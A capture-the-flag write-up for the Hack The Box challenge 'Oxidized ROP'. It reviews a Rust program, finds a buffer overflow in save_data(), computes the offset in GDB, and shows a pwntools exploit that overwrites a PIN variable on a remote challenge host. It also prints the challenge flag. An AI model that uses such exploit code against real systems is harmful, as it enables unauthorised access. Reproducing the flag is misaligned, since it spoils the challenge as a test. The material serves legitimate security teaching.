# Oxidized ROP

> Write-up author: jon-brandy


## Lessons Learned:
- RUST code review.
- Local Variable Overwrite using unicode characters.

## DESCRIPTION:

Our workshop is rapidly oxidizing and we want a statement on its state from every member of the team! > flag in `/challenge/flag.txt`

## HINT:
- NONE

## STEPS:
1. In this challenge, we're given a 64 bit binary, dynamically linked, and not stripped.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ab601b6c-8a5f-44ac-8f83-d71adeb32830)


> BINARY PROTECTIONS

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/5753d15e-03a9-4c69-8e98-78da40535ba0)


2. Noticed, the challenge author disclosed the source code. Hence no need to decompile the binary **for now**.
3. Upon reviewing the **rust** code, found a BOF vuln at the `save_data()` function.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/9cbd9971-2815-4847-9bed-f3b34e2b6e98)


4. Based from the snippet code above, we can conclude that `dest` is a mutable reference to an array of `u8` with fixed size of `INPUT_SIZE` --> 200 chars.
5. Then it tries to copy characters from the `src` string to the `dest` buffer. However, the function does not check whether the length of the `src` string exceeds the size of the `dest`  buffer before copying.
6. This could lead to Buffer Overflow.
7. Next, upon reviewing other LOCs, seems our target is to modify the pin value to **123456**. This function can be accessed at menu **2**.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/7b3ed479-8d3f-458a-bebb-795e132b5820)


8. If we select the second option, we're not allowed to enter a value for the `login_pin`.
9. It's because a global variable named `PIN_ENTRY_ENABLED` os set to false at the beginning. However the pin still checked.
10. So our objective is to utilize the overflow vuln to overwrite the value for local variable `login_pin`.
11. Reviewing the first menu, noticed a `read_user_input()` usage, it's similiar to `gets()` in C. Noticed that `input_buffer` variable is used as the `src` which the boundary is not checked.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/63c4d890-5296-4717-b312-442da756842f)


12. Another things to note in rustpwn, to modify the variable value in rust, we need to encode it so it has wider range of action.
13. Now let's identify the offset.

> USING GDB

```
To identify the offset:

- Starts with send 8 A's then CTRL+C.
- Remembering PIE is enabled, find an address that ends with 11223344.
```

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a86723c4-2f38-43ff-87c1-cccd7763e5d8)


14. Noticed our input not stored as 0x4141414141414141. Instead, each of them has a length of 4 bytes.
15. At this condition the formula to calculate the offset is:

```
p (0x7fffffffdab0 - 0x7fffffffd918) / 4
```

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c9af6b74-8554-488d-8db3-b15422d54d5b)


> RESULT --> 102

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a2a8543b-5672-4816-b479-2728989e36fd)


16. Great! Let's send our payload remotely.

> FULL SCRIPT

```py
from pwn import *

exe = './oxidized-rop'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'INFO'

# sh = process(exe)
sh = remote('94.237.63.83',51413)
padding = 102
# p = flat([
#     asm('nop') * padding,
#     chr(123456).encode() 
# ])

p = cyclic(102) + chr(123456).encode()

sh.sendlineafter(b':', b'1')
sh.sendlineafter(b':', p)
sh.sendlineafter(b':', b'2')

# gdb.attach(sh)
sh.interactive()
```

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/9c4ea9fa-baa9-4946-b267-d5af1f38f290)


17. We've pwned it!

## FLAG

```
HTB{7h3_0r4n63_cr4b_15_74k1n6_0v3r!}
```
